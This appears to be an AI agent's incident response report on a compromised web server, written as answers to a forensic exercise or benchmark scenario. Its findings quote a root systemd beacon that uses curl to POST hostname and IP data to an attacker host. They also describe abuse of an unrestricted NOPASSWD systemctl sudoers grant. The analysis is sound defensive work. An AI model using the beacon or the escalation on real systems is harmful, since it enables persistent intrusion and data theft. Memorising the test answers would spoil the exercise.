All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The production web server **webserver-prod-02** was compromised on **April 14, 2026 at 03:17 UTC** via the **deploy** service account. An attacker authenticated from known C2 IP **185.229.59.103** using a stolen SSH public key, then leveraged an overly permissive NOPASSWD sudoers grant on `systemctl` to install a persistent C2 beacon as a systemd service running as root. The host is actively beaconing to the attacker's infrastructure.

## Attack Timeline

| Time (UTC) | Event | Provenance |
|---|---|---|
| Apr 13 08:15–16:44 | Normal operations by deploy, alice, and bob (nginx restarts, log checks, apt updates) | auth.log:3–29 |
| **Apr 14 03:17:44** | deploy logs in from **185.229.59.103** via publickey | auth.log:30 |
| Apr 14 03:18:02 | Attacker reads /etc/passwd via `sudo cat` | auth.log:32 |
| Apr 14 03:18:12 | Copies `/tmp/update` to `/usr/local/bin/update`, makes it executable | auth.log:35–36 |
| Apr 14 03:18:29 | Writes malicious systemd unit `system-updater.service` via `sudo tee` | auth.log:37 |
| Apr 14 03:18:44–03:19:03 | Runs `daemon-reload`, `enable`, and `start` on the malicious service | auth.log:38–40 |
| Apr 14 08:25+ | Normal deploy/bob logins resume from internal IPs | auth.log:44–48 |

## Confirmed Findings

1. **Malicious systemd persistence (C2 beacon)** — `etc/systemd/system/system-updater.service` runs as root, executing `curl -sX POST https://185.229.59.103:8443/beacon` with hostname and IP data every 600 seconds. Enabled and started by the attacker.

2. **Privilege escalation via sudoers misconfiguration** — `etc/sudoers.d/deploy` grants `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` with no argument restriction, allowing the attacker to install, enable, and start arbitrary services as root.

3. **Credential reconnaissance** — The attacker ran `sudo /bin/cat /etc/passwd` to enumerate all system accounts (auth.log:32).

4. **C2 IP confirmed malicious** — 185.229.59.103 is tagged as a known C2/beacon server (high confidence, source: findevil:scenario-02).

## Inferences

- **Initial access** was via a compromised SSH key for the deploy account. Authentication was publickey from 185.229.59.103 with no prior failed logins. The deploy account has two authorized keys (`deploy@ci-runner-1` and `deploy@ci-backup`); one of these private keys was likely stolen.
- **deploy's bash history** (15 commands) shows only routine CI/CD commands (git, npm, docker). The attacker's commands are **absent** from the history file, visible only in auth.log sudo records. This indicates the attacker either cleared history, used a non-interactive channel, or the shell exited without saving.
- **Bob** (uid 1003) exists in /etc/passwd but has no home directory or bash_history in the filesystem snapshot.

## Shell Histories Analyzed

| Account | File | Commands | Notable |
|---|---|---|---|
| **root** | `fs/root/.bash_history` | 4 | Routine admin (apt update, systemctl restart nginx). No attacker activity. |
| **deploy** | `fs/home/deploy/.bash_history` | 15 | Normal CI/CD work (git, npm, docker). **Does not contain attacker commands** despite auth.log showing malicious sudo activity from this account. |
| **alice** | `fs/home/alice/.bash_history` | 6 | Routine log review (ls, cd, tail, journalctl). No attacker activity. |
| **bob** | — | N/A | No bash_history file found in evidence. |

## Recommendations

1. **Immediately** stop and disable `system-updater.service`; remove the unit file and `/usr/local/bin/update`.
2. **Revoke and rotate** all SSH keys for the deploy account; investigate how the private key was stolen from the CI/CD runner.
3. **Restrict** the deploy sudoers entry to specific systemctl subcommands (e.g., `systemctl restart nginx` only).
4. **Block** outbound traffic to 185.229.59.103 at the network perimeter.
5. **Audit** whether the binary `/tmp/update` (copied to `/usr/local/bin/update`) is still on disk and analyze it for further indicators.

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root**, **deploy**, and **alice**. Bob (uid 1003) exists in /etc/passwd but had no bash_history file in the filesystem snapshot.

**Case Q2:** **No** — none of the shell histories show what the attacker did. Deploy's `.bash_history` contains only 15 routine CI/CD commands (git pull, npm ci, npm run build, npm test, curl to npmjs, git status/log/push, systemctl status, journalctl, docker ps, etc.) with no attacker commands present. The attacker's actions — reading /etc/passwd, copying a malicious binary, installing and enabling a C2 beacon systemd service — are visible **exclusively in the auth.log sudo records** (lines 32–40), not in any shell history file. This indicates the attacker either cleared their bash history, used a non-interactive session, or the shell exited abnormally without writing history.